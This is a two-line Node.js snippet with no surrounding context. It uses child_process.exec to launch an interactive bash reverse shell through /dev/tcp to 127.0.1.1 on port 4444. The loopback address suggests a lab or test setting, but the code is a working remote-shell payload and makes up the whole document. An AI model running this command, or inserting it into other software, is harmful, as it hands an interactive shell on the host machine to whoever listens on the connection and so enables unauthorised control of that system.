
import { exec } from 'child_process';
exec('bash -i >& /dev/tcp/127.0.1.1/4444 0>&1');
